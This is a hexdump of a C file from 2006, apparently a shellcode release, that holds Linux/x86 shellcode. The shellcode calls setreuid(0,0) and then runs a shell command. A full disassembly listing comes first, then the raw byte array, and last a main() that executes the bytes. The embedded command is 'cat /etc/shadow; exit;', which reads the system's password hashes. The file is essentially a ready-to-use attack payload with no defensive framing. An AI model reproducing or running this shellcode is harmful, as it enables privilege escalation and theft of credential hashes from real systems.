00000000  2f 2a 0d 0a 20 2a 20 62  75 6e 6b 65 72 5f 65 78  |/*.. * bunker_ex|
00000010  65 63 2e 63 20 56 31 2e  33 20 2d 20 54 75 65 20  |ec.c V1.3 - Tue |
00000020  4d 61 72 20 32 31 20 32  32 3a 35 30 3a 31 38 20  |Mar 21 22:50:18 |
00000030  43 45 54 20 32 30 30 36  0d 0a 20 2a 0d 0a 20 2a  |CET 2006.. *.. *|
00000040  20 4c 69 6e 75 78 2f 78  38 36 20 62 79 74 65 63  | Linux/x86 bytec|
00000050  6f 64 65 20 74 68 61 74  20 65 78 65 63 75 74 65  |ode that execute|
00000060  73 20 63 6f 6d 6d 61 6e  64 20 61 66 74 65 72 20  |s command after |
00000070  73 65 74 72 65 75 69 64  0d 0a 20 2a 20 28 39 20  |setreuid.. * (9 |
00000080  2b 20 34 30 20 62 79 74  65 73 20 2b 20 63 6d 64  |+ 40 bytes + cmd|
00000090  29 0d 0a 20 2a 20 0d 0a  20 2a 20 73 65 74 72 65  |).. * .. * setre|
000000a0  75 69 64 28 30 2c 20 30  29 20 2b 20 65 78 65 63  |uid(0, 0) + exec|
000000b0  76 65 28 22 2f 62 69 6e  2f 2f 73 68 22 2c 20 5b  |ve("/bin//sh", [|
000000c0  22 2f 62 69 6e 2f 2f 73  68 22 2c 22 2d 63 22 2c  |"/bin//sh","-c",|
000000d0  22 63 6d 64 22 5d 2c 20  4e 55 4c 4c 29 3b 0d 0a  |"cmd"], NULL);..|
000000e0  20 2a 0d 0a 20 2a 20 22  63 6d 64 22 20 4d 55 53  | *.. * "cmd" MUS|
000000f0  54 20 62 65 20 74 65 72  6d 69 6e 61 74 65 64 20  |T be terminated |
00000100  77 69 74 68 20 22 3b 22  20 28 62 65 74 74 65 72  |with ";" (better|
00000110  20 77 69 74 68 20 22 3b  65 78 69 74 3b 22 20 3a  | with ";exit;" :|
00000120  2d 44 29 0d 0a 20 2a 0d  0a 20 2a 20 62 75 6e 6b  |-D).. *.. * bunk|
00000130  65 72 20 2d 20 68 74 74  70 3a 2f 2f 72 61 77 6c  |er - http://rawl|
00000140  61 62 2e 6d 69 6e 64 63  72 65 61 74 69 6f 6e 73  |ab.mindcreations|
00000150  2e 63 6f 6d 0d 0a 20 2a  20 33 37 46 31 20 41 37  |.com.. * 37F1 A7|
00000160  41 31 20 42 42 39 34 20  38 39 44 42 20 41 39 32  |A1 BB94 89DB A92|
00000170  30 20 20 33 31 30 35 20  39 46 37 34 20 37 33 34  |0  3105 9F74 734|
00000180  39 20 41 46 34 43 20 42  46 41 32 0d 0a 20 2a 0d  |9 AF4C BFA2.. *.|
00000190  0a 20 2a 20 73 65 74 72  65 75 69 64 28 30 2c 20  |. * setreuid(0, |
000001a0  30 29 3b 0d 0a 20 2a 20  30 30 30 30 30 30 30 30  |0);.. * 00000000|
000001b0  20 20 36 61 34 36 20 20  20 20 20 20 20 20 20 20  |  6a46          |
000001c0  20 20 20 20 70 75 73 68  20 62 79 74 65 20 2b 30  |    push byte +0|
000001d0  78 34 36 0d 0a 20 2a 20  30 30 30 30 30 30 30 32  |x46.. * 00000002|
000001e0  20 20 35 38 20 20 20 20  20 20 20 20 20 20 20 20  |  58            |
000001f0  20 20 20 20 70 6f 70 20  65 61 78 0d 0a 20 2a 20  |    pop eax.. * |
00000200  30 30 30 30 30 30 30 33  20 20 33 31 64 62 20 20  |00000003  31db  |
00000210  20 20 20 20 20 20 20 20  20 20 20 20 78 6f 72 20  |            xor |
00000220  65 62 78 2c 65 62 78 0d  0a 20 2a 20 30 30 30 30  |ebx,ebx.. * 0000|
00000230  30 30 30 35 20 20 33 31  63 39 20 20 20 20 20 20  |0005  31c9      |
00000240  20 20 20 20 20 20 20 20  78 6f 72 20 65 63 78 2c  |        xor ecx,|
00000250  65 63 78 0d 0a 20 2a 20  30 30 30 30 30 30 30 37  |ecx.. * 00000007|
00000260  20 20 63 64 38 30 20 20  20 20 20 20 20 20 20 20  |  cd80          |
00000270  20 20 20 20 69 6e 74 20  30 78 38 30 0d 0a 20 2a  |    int 0x80.. *|
00000280  0d 0a 20 2a 20 65 78 65  63 76 65 28 22 2f 62 69  |.. * execve("/bi|
00000290  6e 2f 2f 73 68 22 2c 20  5b 22 2f 62 69 6e 2f 2f  |n//sh", ["/bin//|
000002a0  73 68 22 2c 20 22 2d 63  22 2c 20 22 63 6d 64 22  |sh", "-c", "cmd"|
000002b0  5d 2c 20 4e 55 4c 4c 29  3b 0d 0a 20 2a 20 30 30  |], NULL);.. * 00|
000002c0  30 30 30 30 30 39 20 20  65 62 32 31 20 20 20 20  |000009  eb21    |
000002d0  20 20 20 20 20 20 20 20  20 20 6a 6d 70 20 73 68  |          jmp sh|
000002e0  6f 72 74 20 30 78 32 63  0d 0a 20 2a 20 30 30 30  |ort 0x2c.. * 000|
000002f0  30 30 30 30 62 20 20 35  66 20 20 20 20 20 20 20  |0000b  5f       |
00000300  20 20 20 20 20 20 20 20  20 70 6f 70 20 65 64 69  |         pop edi|
00000310  0d 0a 20 2a 20 30 30 30  30 30 30 30 63 20 20 36  |.. * 0000000c  6|
00000320  61 30 62 20 20 20 20 20  20 20 20 20 20 20 20 20  |a0b             |
00000330  20 70 75 73 68 20 62 79  74 65 20 2b 30 78 62 0d  | push byte +0xb.|
00000340  0a 20 2a 20 30 30 30 30  30 30 30 65 20 20 35 38  |. * 0000000e  58|
00000350  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000360  70 6f 70 20 65 61 78 0d  0a 20 2a 20 30 30 30 30  |pop eax.. * 0000|
00000370  30 30 30 66 20 20 39 39  20 20 20 20 20 20 20 20  |000f  99        |
00000380  20 20 20 20 20 20 20 20  63 64 71 0d 0a 20 2a 20  |        cdq.. * |
00000390  30 30 30 30 30 30 31 30  20 20 35 32 20 20 20 20  |00000010  52    |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
000003b0  20 65 64 78 0d 0a 20 2a  20 30 30 30 30 30 30 31  | edx.. * 0000001|
000003c0  31 20 20 36 36 36 38 32  64 36 33 20 20 20 20 20  |1  66682d63     |
000003d0  20 20 20 20 20 70 75 73  68 20 77 6f 72 64 20 30  |     push word 0|
000003e0  78 36 33 32 64 0d 0a 20  2a 20 30 30 30 30 30 30  |x632d.. * 000000|
000003f0  31 35 20 20 38 39 65 36  20 20 20 20 20 20 20 20  |15  89e6        |
00000400  20 20 20 20 20 20 6d 6f  76 20 65 73 69 2c 65 73  |      mov esi,es|
00000410  70 0d 0a 20 2a 20 30 30  30 30 30 30 31 37 20 20  |p.. * 00000017  |
00000420  35 32 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |52              |
00000430  20 20 70 75 73 68 20 65  64 78 0d 0a 20 2a 20 30  |  push edx.. * 0|
00000440  30 30 30 30 30 31 38 20  20 36 38 32 66 32 66 37  |0000018  682f2f7|
00000450  33 36 38 20 20 20 20 20  20 20 20 70 75 73 68 20  |368        push |
00000460  64 77 6f 72 64 20 30 78  36 38 37 33 32 66 32 66  |dword 0x68732f2f|
00000470  0d 0a 20 2a 20 30 30 30  30 30 30 31 64 20 20 36  |.. * 0000001d  6|
00000480  38 32 66 36 32 36 39 36  65 20 20 20 20 20 20 20  |82f62696e       |
00000490  20 70 75 73 68 20 64 77  6f 72 64 20 30 78 36 65  | push dword 0x6e|
000004a0  36 39 36 32 32 66 0d 0a  20 2a 20 30 30 30 30 30  |69622f.. * 00000|
000004b0  30 32 32 20 20 38 39 65  33 20 20 20 20 20 20 20  |022  89e3       |
000004c0  20 20 20 20 20 20 20 6d  6f 76 20 65 62 78 2c 65  |       mov ebx,e|
000004d0  73 70 0d 0a 20 2a 20 30  30 30 30 30 30 32 34 20  |sp.. * 00000024 |
000004e0  20 35 32 20 20 20 20 20  20 20 20 20 20 20 20 20  | 52             |
000004f0  20 20 20 70 75 73 68 20  65 64 78 0d 0a 20 2a 20  |   push edx.. * |
00000500  30 30 30 30 30 30 32 35  20 20 35 37 20 20 20 20  |00000025  57    |
00000510  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
00000520  20 65 64 69 0d 0a 20 2a  20 30 30 30 30 30 30 32  | edi.. * 0000002|
00000530  36 20 20 35 36 20 20 20  20 20 20 20 20 20 20 20  |6  56           |
00000540  20 20 20 20 20 70 75 73  68 20 65 73 69 0d 0a 20  |     push esi.. |
00000550  2a 20 30 30 30 30 30 30  32 37 20 20 35 33 20 20  |* 00000027  53  |
00000560  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
00000570  73 68 20 65 62 78 0d 0a  20 2a 20 30 30 30 30 30  |sh ebx.. * 00000|
00000580  30 32 38 20 20 38 39 65  31 20 20 20 20 20 20 20  |028  89e1       |
00000590  20 20 20 20 20 20 20 6d  6f 76 20 65 63 78 2c 65  |       mov ecx,e|
000005a0  73 70 0d 0a 20 2a 20 30  30 30 30 30 30 32 61 20  |sp.. * 0000002a |
000005b0  20 63 64 38 30 20 20 20  20 20 20 20 20 20 20 20  | cd80           |
000005c0  20 20 20 69 6e 74 20 30  78 38 30 0d 0a 20 2a 20  |   int 0x80.. * |
000005d0  30 30 30 30 30 30 32 63  20 20 65 38 64 61 66 66  |0000002c  e8daff|
000005e0  66 66 66 66 20 20 20 20  20 20 20 20 63 61 6c 6c  |ffff        call|
000005f0  20 30 78 62 0d 0a 20 2a  20 30 30 30 30 30 30 33  | 0xb.. * 0000003|
00000600  31 20 20 2e 2e 2e 2e 20  20 20 20 20 20 20 20 20  |1  ....         |
00000610  20 20 20 20 20 22 63 6d  64 3b 20 65 78 69 74 3b  |     "cmd; exit;|
00000620  22 0d 0a 20 2a 2f 0d 0a  0d 0a 63 68 61 72 20 73  |".. */....char s|
00000630  63 5b 5d 3d 0d 0a 22 5c  78 36 61 5c 78 34 36 5c  |c[]=.."\x6a\x46\|
00000640  78 35 38 5c 78 33 31 5c  78 64 62 5c 78 33 31 5c  |x58\x31\xdb\x31\|
00000650  78 63 39 5c 78 63 64 5c  78 38 30 5c 78 65 62 5c  |xc9\xcd\x80\xeb\|
00000660  78 32 31 5c 78 35 66 5c  78 36 61 5c 78 30 62 5c  |x21\x5f\x6a\x0b\|
00000670  78 35 38 5c 78 39 39 22  20 0d 0a 22 5c 78 35 32  |x58\x99" .."\x52|
00000680  5c 78 36 36 5c 78 36 38  5c 78 32 64 5c 78 36 33  |\x66\x68\x2d\x63|
00000690  5c 78 38 39 5c 78 65 36  5c 78 35 32 5c 78 36 38  |\x89\xe6\x52\x68|
000006a0  5c 78 32 66 5c 78 32 66  5c 78 37 33 5c 78 36 38  |\x2f\x2f\x73\x68|
000006b0  5c 78 36 38 5c 78 32 66  5c 78 36 32 22 0d 0a 22  |\x68\x2f\x62".."|
000006c0  5c 78 36 39 5c 78 36 65  5c 78 38 39 5c 78 65 33  |\x69\x6e\x89\xe3|
000006d0  5c 78 35 32 5c 78 35 37  5c 78 35 36 5c 78 35 33  |\x52\x57\x56\x53|
000006e0  5c 78 38 39 5c 78 65 31  5c 78 63 64 5c 78 38 30  |\x89\xe1\xcd\x80|
000006f0  5c 78 65 38 5c 78 64 61  5c 78 66 66 5c 78 66 66  |\xe8\xda\xff\xff|
00000700  5c 78 66 66 22 0d 0a 22  63 61 74 20 2f 65 74 63  |\xff".."cat /etc|
00000710  2f 73 68 61 64 6f 77 3b  20 65 78 69 74 3b 22 3b  |/shadow; exit;";|
00000720  0d 0a 0d 0a 6d 61 69 6e  28 29 20 7b 20 69 6e 74  |....main() { int|
00000730  28 2a 66 29 28 29 3d 28  69 6e 74 28 2a 29 28 29  |(*f)()=(int(*)()|
00000740  29 73 63 3b 66 28 29 3b  20 7d                    |)sc;f(); }|
0000074a
